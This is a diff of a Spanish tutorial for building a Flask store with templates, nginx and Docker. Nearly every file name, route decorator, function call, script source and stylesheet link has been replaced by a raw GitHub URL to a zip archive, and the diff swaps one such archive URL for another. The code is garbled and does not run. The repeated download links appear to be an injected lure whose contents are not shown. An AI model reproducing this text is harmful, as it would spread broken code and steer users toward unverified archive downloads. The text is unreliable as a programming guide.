+https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip('/add-to-cart/<int:product_id>', methods=['POST'])
 def add_to_cart(product_id):
     # TODO: Implementar agregar producto al carrito
     # Enviar request a la API
     pass
 
-https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip('/logout')
+https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip('/logout')
 def logout():
     # TODO: Implementar logout
     # Limpiar sesión
@@ -651,12 +651,12 @@ def is_logged_in():
     pass
 
 if __name__ == '__main__':
-    https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip(host='0.0.0.0', port=5000, debug=True)
+    https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip(host='0.0.0.0', port=5000, debug=True)
 ```
 
 ### 4.4 Templates HTML
 
-Archivo `https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip`:
+Archivo `https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip`:
 
 ```html
 <!DOCTYPE html>
@@ -665,8 +665,8 @@ Archivo `https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>{% block title %}Tienda Virtual{% endblock %}</title>
-    <link href="https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip" rel="stylesheet">
-    <link rel="stylesheet" href="{{ url_for('static', filename='https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip') }}">
+    <link href="https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip" rel="stylesheet">
+    <link rel="stylesheet" href="{{ url_for('static', filename='https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip') }}">
 </head>
 <body>
     <!-- TODO: Crear navbar con navegación -->
@@ -685,16 +685,16 @@ Archivo `https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-
         {% block content %}{% endblock %}
     </div>
 
-    <script src="https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip"></script>
-    <script src="{{ url_for('static', filename='https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip') }}"></script>
+    <script src="https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip"></script>
+    <script src="{{ url_for('static', filename='https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip') }}"></script>
 </body>
 </html>
 ```
 
-Archivo `https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip`:
+Archivo `https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip`:
 
 ```html
-{% extends "https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip" %}
+{% extends "https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip" %}
 
 {% block title %}Inicio - Tienda Virtual{% endblock %}
 
@@ -709,10 +709,10 @@ Archivo `https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-
 {% endblock %}
 ```
 
-Archivo `https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip`:
+Archivo `https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip`:
 
 ```html
-{% extends "https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip" %}
+{% extends "https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip" %}
 
 {% block title %}Productos - Tienda Virtual{% endblock %}
 
@@ -729,7 +729,7 @@ Archivo `https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-
 
 ### 4.5 Estilos CSS
 
-Archivo `https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip`:
+Archivo `https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip`:
 
 ```css
 /* TODO: Agregar estilos personalizados */
@@ -750,12 +750,12 @@ body {
 
 ### 4.6 JavaScript
 
-Archivo `https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip`:
+Archivo `https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip`:
 
 ```javascript
 // TODO: Agregar funcionalidad JavaScript
 
-https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip('DOMContentLoaded', function() {
+https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip('DOMContentLoaded', function() {
     // TODO: Inicializar componentes cuando cargue la página
 });
 
@@ -801,7 +801,7 @@ Archivo `proxy/Dockerfile`:
 FROM nginx:alpine
 
 # Copiar configuración personalizada
-COPY https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip
+COPY https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip
 
 # Exponer el puerto
 EXPOSE 80
@@ -811,7 +811,7 @@ EXPOSE 80
 
 ### 5.2 Configuración de Nginx
 
-Archivo `https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip`:
+Archivo `https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip`:
 
 ```nginx
 # TODO: Configurar nginx como proxy reverso
@@ -849,8 +849,8 @@ http {
         }
 
         # TODO: Configurar logs
-        # access_log https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip;
-        # error_log https://raw.githubusercontent.com/axlcraft/as-taller3/main/sporadic/as-taller3.zip;
+        # access_log https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip;
+        # error_log https://raw.githubusercontent.com/axlcraft/as-taller3/main/database/taller-as-v2.9.zip;
     }
 }
 ```
